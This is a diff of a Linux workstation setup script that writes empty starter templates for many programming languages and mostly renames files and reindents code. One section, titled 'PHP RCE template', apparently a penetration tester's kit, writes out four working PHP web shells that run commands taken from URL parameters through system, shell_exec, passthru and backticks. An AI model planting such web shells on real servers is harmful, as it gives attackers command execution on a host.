@@ -108,10 +108,10 @@ sudo cp -r ~/.icons/* /root/.icons/ 2>/dev/null
 sudo cp ~/.config/gtk-3.0/settings.ini /root/.config/gtk-3.0/
 
 # C# Template - create directory and files
-mkdir -p ~/Templates/Cs_testing
+mkdir -p ~/Templates/cs_testing
 
 # C# .csproj file
-cat > ~/Templates/Cs_testing/Cs_testing.csproj << 'EOF'
+cat > ~/Templates/cs_testing/cs_testing.csproj << 'EOF'
 <Project Sdk="Microsoft.NET.Sdk">
 
   <PropertyGroup>
@@ -125,7 +125,7 @@ cat > ~/Templates/Cs_testing/Cs_testing.csproj << 'EOF'
 EOF
 
 # C# .sln file
-cat > ~/Templates/Cs_testing/Cs_testing.sln << 'EOF'
+cat > ~/Templates/cs_testing/cs_testing.sln << 'EOF'
 Microsoft Visual Studio Solution File, Format Version 12.00
 # Visual Studio Version 17
 VisualStudioVersion = 17.5.2.0
@@ -133,107 +133,125 @@ MinimumVisualStudioVersion = 10.0.40219.1
 Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "Cs_testing", "Cs_testing.csproj", "{E7C77365-64A1-B40D-35EE-CF6EAA2AE326}"
 EndProject
 Global
-	GlobalSection(SolutionConfigurationPlatforms) = preSolution
-		Debug|Any CPU = Debug|Any CPU
-		Release|Any CPU = Release|Any CPU
-	EndGlobalSection
-	GlobalSection(ProjectConfigurationPlatforms) = postSolution
-		{E7C77365-64A1-B40D-35EE-CF6EAA2AE326}.Debug|Any CPU.ActiveCfg = Debug|Any CPU
-		{E7C77365-64A1-B40D-35EE-CF6EAA2AE326}.Debug|Any CPU.Build.0 = Debug|Any CPU
-		{E7C77365-64A1-B40D-35EE-CF6EAA2AE326}.Release|Any CPU.ActiveCfg = Release|Any CPU
-		{E7C77365-64A1-B40D-35EE-CF6EAA2AE326}.Release|Any CPU.Build.0 = Release|Any CPU
-	EndGlobalSection
-	GlobalSection(SolutionProperties) = preSolution
-		HideSolutionNode = FALSE
-	EndGlobalSection
-	GlobalSection(ExtensibilityGlobals) = postSolution
-		SolutionGuid = {8E3EBE5F-5726-4511-AB60-D1BF277D58B4}
-	EndGlobalSection
+  GlobalSection(SolutionConfigurationPlatforms) = preSolution
+    Debug|Any CPU = Debug|Any CPU
+    Release|Any CPU = Release|Any CPU
+  EndGlobalSection
+  GlobalSection(ProjectConfigurationPlatforms) = postSolution
+    {E7C77365-64A1-B40D-35EE-CF6EAA2AE326}.Debug|Any CPU.ActiveCfg = Debug|Any CPU
+    {E7C77365-64A1-B40D-35EE-CF6EAA2AE326}.Debug|Any CPU.Build.0 = Debug|Any CPU
+    {E7C77365-64A1-B40D-35EE-CF6EAA2AE326}.Release|Any CPU.ActiveCfg = Release|Any CPU
+    {E7C77365-64A1-B40D-35EE-CF6EAA2AE326}.Release|Any CPU.Build.0 = Release|Any CPU
+  EndGlobalSection
+  GlobalSection(SolutionProperties) = preSolution
+    HideSolutionNode = FALSE
+  EndGlobalSection
+  GlobalSection(ExtensibilityGlobals) = postSolution
+    SolutionGuid = {8E3EBE5F-5726-4511-AB60-D1BF277D58B4}
+  EndGlobalSection
 EndGlobal
 EOF
 
 # C# Program.cs file
-cat > ~/Templates/Cs_testing/Program.cs << 'EOF'
+cat > ~/Templates/cs_testing/Program.cs << 'EOF'
 using System;
 using Microsoft.Extensions.Configuration;
 
 class Program {
-    static void Main(string[] args) {
-        Console.WriteLine("/*== Project to test ==*/");
+  static void Main(string[] args) {
+    Console.WriteLine("/*== Project to test ==*/");
 
-        Program program = new Program();
-        program.Test();
-    }
+    Program program = new Program();
+    program.Test();
+  }
 
-    private void Test() {
-        
-    }
+  private void Test() {
+    
+  }
 }
 EOF
 
 # Basic HTML template
-cat > ~/Templates/HTML_template.html << 'EOF'
+cat > ~/Templates/html_template.html << 'EOF'
 <!DOCTYPE html>
 <html lang="es">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            margin: 0;
-            padding: 20px;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Document</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 20px;
+    }
+  </style>
 </head>
 <body>
-    <h1>HTML Template</h1>
+  <h1>HTML Template</h1>
 </body>
 </html>
 EOF
 
 # PHP RCE template
-cat > ~/Templates/Php_rce_script.php << 'EOF'
-<?php
-	class PHP_rce {
-	    public static function main() {
-	        if(isset($_GET['cmd'])) {
-	            system($_GET['cmd']);
-	        }
-	        
-	        if(isset($_GET['exec'])) {
-	            echo shell_exec($_GET['exec']);
-	        }
-	        
-	        if(isset($_GET['pass'])) {
-	            passthru($_GET['pass']);
-	        }
-	        
-	        if(isset($_GET['back'])) {
-	            echo `{$_GET['back']}`;
-	        }
-	    }
-	}
+cat > ~/Templates/php_rce_scripts.php << 'EOF'
+#!/bin/bash
 
-	PHP_rce::main();
+echo "
+<?php
+echo 'PHP cmd';
+
+if(isset($_GET['cmd'])) {
+  system($_GET['cmd']);
+}
 ?>
+"
+
+echo "
+<?php
+echo 'PHP exec';
+
+if(isset($_GET['exec'])) {
+  echo shell_exec($_GET['exec']);
+}
+?>
+"
+
+echo "
+<?php
+echo 'PHP passthru';
+
+if(isset($_GET['pass'])) {
+  passthru($_GET['pass']);
+}
+?>
+"
+
+echo "
+<?php
+echo 'PHP back';
+
+if(isset($_GET['back'])) {
+  echo `{$_GET['back']}`;
+}
+?>
+"
 EOF
 
 # PHP template
-cat > ~/Templates/PHP_test.php << 'EOF'
+cat > ~/Templates/php_test.php << 'EOF'
 <?php
 class PHP_test {
-    public static function main() {
-        echo "/*== PHP Project to test ==*/";
-        
-        $app = new PHP_test();
-        $app->test();
-    }
+  public static function main() {
+    echo "/*== PHP Project to test ==*/";
     
-    private function test() {
-        
-    }
+    $app = new PHP_test();
+    $app->test();
+  }
+  
+  private function test() {
+    
+  }
 }
 
 PHP_test::main();
@@ -241,43 +259,43 @@ PHP_test::main();
 EOF
 
 # JavaScript template
-cat > ~/Templates/JavaScript_test.js << 'EOF'
+cat > ~/Templates/javascript_test.js << 'EOF'
 class JavaScript_test {
-    static main() {
-        console.log("/*== JavaScript Project to test ==*/");
-        
-        const app = new JavaScript_test();
-        app.test();
-    }
+  static main() {
+    console.log("/*== JavaScript Project to test ==*/");
     
-    test() {
-        
-    }
+    const app = new JavaScript_test();
+    app.test();
+  }
+  
+  test() {
+    
+  }
 }
 
 JavaScript_test.main();
 EOF
 
 # PowerShell template
-cat > ~/Templates/PowerShell_test.ps1 << 'EOF'
+cat > ~/Templates/powershell_test.ps1 << 'EOF'
 class PowerShell_test {
-    static [void] Main() {
-        Write-Host "/*== PowerShell Project to test ==*/"
-        
-        $app = [PowerShell_test]::new()
-        $app.Test()
-    }
+  static [void] Main() {
+    Write-Host "/*== PowerShell Project to test ==*/"
     
-    [void] Test() {
-        
-    }
+    $app = [PowerShell_test]::new()
+    $app.Test()
+  }
+  
+  [void] Test() {
+    
+  }
 }
 
 PowerShell_test::Main()
 EOF
 
 # Go template
-cat > ~/Templates/Go_test.go << 'EOF'
+cat > ~/Templates/go_test.go << 'EOF'
 package main
 
 import "fmt"
@@ -285,146 +303,146 @@ import "fmt"
 type Go_test struct {}
 
 func main() {
-    fmt.Println("/*== Go Project to test ==*/")
-    
-    app := Go_test{}
-    app.Test()
+  fmt.Println("/*== Go Project to test ==*/")
+  
+  app := Go_test{}
+  app.Test()
 }
 
 func (g Go_test) Test() {
-    
+  
 }
 EOF
 
 # Rust template
-cat > ~/Templates/Rust_test.rs << 'EOF'
+cat > ~/Templates/rust_test.rs << 'EOF'
 struct Rust_test;
 
 impl Rust_test {
-    fn main() {
-        println!("/*== Rust Project to test ==*/");
-        
-        let app = Rust_test;
-        app.test();
-    }
+  fn main() {
+    println!("/*== Rust Project to test ==*/");
     
-    fn test(&self) {
-        
-    }
+    let app = Rust_test;
+    app.test();
+  }
+  
+  fn test(&self) {
+    
+  }
 }
 
 fn main() {
-    Rust_test::main();
+  Rust_test::main();
 }
 EOF
 
 # Java template
-cat > ~/Templates/Java_test.java << 'EOF'
+cat > ~/Templates/java_test.java << 'EOF'
 public class Java_test {
-    public static void main(String[] args) {
-        System.out.println("/*== Java Project to test ==*/");
-        
-        Java_test app = new Java_test();
-        app.test();
-    }
+  public static void main(String[] args) {
+    System.out.println("/*== Java Project to test ==*/");
     
-    private void test() {
-        
-    }
+    Java_test app = new Java_test();
+    app.test();
+  }
+  
+  private void test() {
+    
+  }
 }
 EOF
 
 # Bash template
-cat > ~/Templates/Bash_test.sh << 'EOF'
+cat > ~/Templates/bash_test.sh << 'EOF'
 #!/bin/bash
 
 class Bash_test {
-    main() {
-        echo "/*== Bash Project to test ==*/"
-        
-        Bash_test app
-        app.test
-    }
+  main() {
+    echo "/*== Bash Project to test ==*/"
     
-    test() {
-        
-    }
+    Bash_test app
+    app.test
+  }
+  
+  test() {
+    
+  }
 }
 
 Bash_test.main "$@"
 EOF
 
 # Python template
-cat > ~/Templates/Py_testing.py << 'EOF'
+cat > ~/Templates/py_testing.py << 'EOF'
 class Py_testing:
-    def main():
-        print('/*== Project to test ==*/')
+  def main():
+    print('/*== Project to test ==*/')
 
-        program = Py_testing()
-        program.test()
+    program = Py_testing()
+    program.test()
 
-    def test(self):
-        pass
+  def test(self):
+    pass
 
 if __name__ == '__main__':
-    Py_testing.main()
+  Py_testing.main()
 EOF
 
 # C++ template
-cat > ~/Templates/CPP_test.cpp << 'EOF'
+cat > ~/Templates/cpp_test.cpp << 'EOF'
 #include <iostream>
 
 class CPP_test {
 public:
-    static void main() {
-        std::cout << "/*== C++ Project to test ==*/" << std::endl;
-        
-        CPP_test app;
-        app.test();
-    }
+  static void main() {
+    std::cout << "/*== C++ Project to test ==*/" << std::endl;
     
-    void test() {
-        
-    }
+    CPP_test app;
+    app.test();
+  }
+  
+  void test() {
+    
+  }
 };
 
 int main() {
-    CPP_test::main();
-    return 0;
+  CPP_test::main();
+  return 0;
 }
 EOF
 
 # Ruby template
-cat > ~/Templates/Ruby_test.rb << 'EOF'
+cat > ~/Templates/ruby_test.rb << 'EOF'
 class Ruby_test
-    def self.main
-        puts "/*== Ruby Project to test ==*/"
-        
-        app = Ruby_test.new
-        app.test
-    end
+  def self.main
+    puts "/*== Ruby Project to test ==*/"
     
-    def test
-        
-    end
+    app = Ruby_test.new
+    app.test
+  end
+  
+  def test
+    
+  end
 end
 
 Ruby_test.main
 EOF
 
 # TypeScript template
-cat > ~/Templates/TypeScript_test.ts << 'EOF'
+cat > ~/Templates/typescript_test.ts << 'EOF'
 class TypeScript_test {
-    static main(): void {
-        console.log("/*== TypeScript Project to test ==*/");
-        
-        const app = new TypeScript_test();
-        app.test();
-    }
+  static main(): void {
+    console.log("/*== TypeScript Project to test ==*/");
     
-    test(): void {
-        
-    }
+    const app = new TypeScript_test();
+    app.test();
+  }
+  
+  test(): void {
+    
+  }
 }
 
 TypeScript_test.main();
@@ -525,9 +543,9 @@ mkdir -p jetbrains && cd jetbrains
 [ ! -f "JetBrainsMono*.zip" ] && echo "The JetBrains font has not been downloaded"
 mv ~/Downloads/JetBrainsMono*.zip . 2>/dev/null
 if ls JetBrainsMono*.zip 1> /dev/null 2>&1; then
-    unzip -o JetBrainsMono*.zip
-    sudo mkdir -p /usr/share/fonts/truetype/jetbrains-mono
-    sudo mv fonts/ttf/* /usr/share/fonts/truetype/jetbrains-mono/ 2>/dev/null
+  unzip -o JetBrainsMono*.zip
+  sudo mkdir -p /usr/share/fonts/truetype/jetbrains-mono
+  sudo mv fonts/ttf/* /usr/share/fonts/truetype/jetbrains-mono/ 2>/dev/null
 fi
 
 [ -d "jetbrains" ] && rm -rf jetbrains
